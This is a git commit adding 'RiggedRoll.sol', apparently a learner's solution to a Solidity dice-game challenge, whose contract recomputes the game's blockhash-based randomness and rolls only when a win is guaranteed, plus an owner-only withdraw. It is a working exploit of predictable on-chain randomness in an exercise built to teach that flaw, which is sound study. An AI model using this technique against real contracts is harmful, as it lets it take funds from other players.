df148acb7b5e55cc795aec5f905936c5bb088a68
Muriuki <97036296+muhreeowki@users.noreply.github.com>
2024-06-12 11:43:24 +0300

    Added challenge 3

---
+++ challenge-3-dice-game/packages/hardhat/contracts/RiggedRoll.sol
@@ -0,0 +1,46 @@
+pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negativly impacts submission grading
+//SPDX-License-Identifier: MIT
+
+import "hardhat/console.sol";
+import "./DiceGame.sol";
+import "@openzeppelin/contracts/access/Ownable.sol";
+
+contract RiggedRoll is Ownable {
+	DiceGame public diceGame;
+
+	constructor(address payable diceGameAddress) {
+		diceGame = DiceGame(diceGameAddress);
+	}
+
+	// Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
+	function withdraw(address _addr, uint256 _amount) public onlyOwner {
+		require(address(this).balance >= _amount, "Insufficient balance");
+		(bool success, ) = payable(_addr).call{ value: _amount }("");
+		require(success, "Transfer failed.");
+	}
+
+	// Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
+	function riggedRoll() public payable {
+		require(
+			address(this).balance >= .002 ether,
+			"Contract balance is too low"
+		);
+
+		bytes32 prevHash = blockhash(block.number - 1);
+		bytes32 hash = keccak256(
+			abi.encodePacked(prevHash, address(diceGame), diceGame.nonce())
+		);
+		uint256 roll = uint256(hash) % 16;
+
+		console.log("\t", "   Dice Game Roll:", roll);
+
+		if (roll > 5) {
+			revert("You can't win this time!");
+		}
+
+		diceGame.rollTheDice{ value: .002 ether }();
+	}
+
+	// Include the `receive()` function to enable the contract to receive incoming Ether.
+	receive() external payable {}
+}
